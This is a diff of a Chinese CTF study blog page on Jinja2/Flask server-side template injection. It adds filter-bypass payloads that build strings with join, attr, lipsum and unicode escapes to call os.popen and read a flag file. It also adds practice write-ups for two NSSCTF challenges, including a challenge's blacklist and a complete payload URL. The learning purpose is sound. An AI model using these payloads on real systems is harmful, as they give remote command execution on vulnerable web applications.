@@ -549,13 +549,13 @@ code=&#123;&#123;()['__cla'+'ss__']['__ba'+'se__']['__subcl'+'asses__']()[117]['
 </code></pre>
 <p> <img src="https://i0.hdslb.com/bfs/article/af84e2e9dadc2cf4d1a42cb306014bfe290349942.png"></p>
 <p>当加上list就会变成列表就可以<code>[8]</code>等方式获得数据</p>
-<h3 id="过滤-‘-“-request"><a href="#过滤-‘-“-request" class="headerlink" title="过滤 ‘ “ + request . [ ]"></a>过滤 ‘ “ + request . [ ]</h3><pre><code>code=&#123;% set a = dict(__class__=1)|join%&#125;&#123;% set b = dict(__base__=1)|join%&#125;&#123;% set c = dict(__subclasses__=1)|join%&#125;&#123;% set d = dict(__getitem__=1)|join%&#125;&#123;% set f = dict(__init__=1)|join%&#125;&#123;% set g = dict(__globals__=1)|join%&#125;&#123;% set h = dict(popen=1 )|join%&#125;&#123;%set i = (&#123;&#125;|select()|string()|attr(d)(10))%&#125;&#123;% set j = (dict(cat=1)|join,i,dict(flag=1)|join)|join%&#125;&#123;% set a1 = dict(read=1)|join%&#125;&#123;&#123;()|attr(a)|attr(b)|attr(c)()|attr(d)(117)|attr(f)|attr(g)|attr(d)(h)(j)|attr(a1)()&#125;&#125;
+<h3 id="过滤-‘-“-request"><a href="#过滤-‘-“-request" class="headerlink" title="过滤 ‘ “ + request . [ ]"></a>过滤 ‘ “ + request . [ ]</h3><pre><code class="python">code=&#123;% set getitem = dict(__getitem__=1)|join%&#125;&#123;%set kg = (&#123;&#125;|select()|string()|attr(getitem)(10))%&#125;&#123;% set globals=dict(__globals__=a)|join%&#125;&#123;% set os=dict(os=a)|join%&#125;&#123;% set payload=(dict(ls=a)|join)|join%&#125;&#123;% set popen=dict(popen=a)|join%&#125;&#123;% set read=dict(read=a)|join%&#125;&#123;&#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()&#125;&#125;
 </code></pre>
 <p>主要是利用join拼接+addr绕过点，最后执行命令那要绕过单引号，就利用了上面获取符号例子里获取空格</p>
 <h3 id="过滤-‘-“-0-9-空格"><a href="#过滤-‘-“-0-9-空格" class="headerlink" title="过滤 ‘ “ _ 0-9 . [ ] \ 空格"></a>过滤 ‘ “ _ 0-9 . [ ] \ 空格</h3><pre><code>&#123;&#123;lipsum|string|list&#125;&#125;
 </code></pre>
 <p>获取过滤的符号<br>再构造payload</p>
-<pre><code>&#123;% set nine = dict(aaaaaaaaa=a)|join|count%&#125;&#123;%set pop=dict(pop=a)|join%&#125;&#123;%set kg=(lipsum|string|list)|attr(pop)(nine)%&#125;&#123;%set eighteen=nine+nine%&#125;&#123;%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%&#125;&#123;%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join%&#125;&#123;%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%&#125;&#123;% set os=dict(os=a)|join%&#125;&#123;% set popen=dict(popen=a)|join%&#125;&#123;% set payload=(dict(cat=cat)|join,kg,dict(flag=flag)|join)|join %&#125;&#123;% set read=dict(read=a)|join%&#125;&#123;&#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()&#125;&#125;
+<pre><code class="python">&#123;% set nine = dict(aaaaaaaaa=a)|join|count%&#125;&#123;%set pop=dict(pop=a)|join%&#125;&#123;%set kg=(lipsum|string|list)|attr(pop)(nine)%&#125;&#123;%set eighteen=nine+nine%&#125;&#123;%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%&#125;&#123;%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join%&#125;&#123;%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%&#125;&#123;% set os=dict(os=a)|join%&#125;&#123;% set popen=dict(popen=a)|join%&#125;&#123;% set payload=(dict(cat=cat)|join,kg,dict(flag=flag)|join)|join %&#125;&#123;% set read=dict(read=a)|join%&#125;&#123;&#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()&#125;&#125;
 </code></pre>
 <h1 id="获取config"><a href="#获取config" class="headerlink" title="获取config"></a>获取config</h1><p>无过滤直接<code>&#123;&#123;config&#125;&#125;</code>就可以获取</p>
 <p>当被过滤时，可利用已加载内置函数或对象寻找被过滤字符串</p>
@@ -618,6 +618,33 @@ macOS: ioeg -c IOPlatformExpertDevice -d 2
 
 
 windows:HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid
+</code></pre>
+<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p><a href="https://www.nssctf.cn/problem/910">[安洵杯 2020]Normal SSTI</a></p>
+<pre><code class="python">url_black_list = [&#39;%1c&#39;, &#39;%1d&#39;, &#39;%1f&#39;, &#39;%1e&#39;, &#39;%20&#39;, &#39;%2b&#39;, &#39;%2c&#39;, &#39;%3c&#39;, &#39;%3e&#39;]
+black_list = [&#39;.&#39;, &#39;[&#39;, &#39;]&#39;, &#39;&#123;&#123;', '=', '_', '\'', '""', '\\x', 'request', 'config', 'session', 'url_for', 'g',
+              'get_flashed_messages', '*', 'for', 'if', 'format', 'list', 'lower', 'slice', 'striptags', 'trim',
+              'xmlattr', 'tojson', 'set', '=', 'chr']
+
+payload
+
+http://node4.anna.nssctf.cn:28698/test
+?url=&#123;%print(()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(137)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("popen")("\u0063\u0061\u0074\u0020\u002F\u0066\u006C\u0061\u0067")|attr("read")())%&#125;
+
+```
+或者
+`fenjing`一把梭
+
+[[HNCTF 2022 WEEK3]ssssti](https://www.nssctf.cn/problem/3022)
+
+过滤：_ ' " os 
+
+```
+1.
+&#123;% set xhx=((lipsum|string)[18])%&#125;&#123;% set kg=((lipsum|string)[9])%&#125;&#123;% set s=((lipsum|string)[27])%&#125;&#123;% set o=((lipsum|string)[7])%&#125;&#123;% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %&#125;&#123;% set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join %&#125;&#123;% set a=(o,s)|join%&#125;&#123;% set popen=dict(popen=a)|join %&#125;&#123;% set playload = (dict(cat=a)|join,kg,dict(flag=a)|join)|join %&#125;&#123;% set read=dict(read=a)|join %&#125;&#123;&#123;lipsum|attr(globals)|attr(getitem)(a)|attr(popen)(playload)|attr(read)()&#125;&#125;
+
+或者
+
+&#123;&#123;(lipsum | attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=globals&amp;b=os&amp;c=tac f*
 </code></pre>
 
         </div>
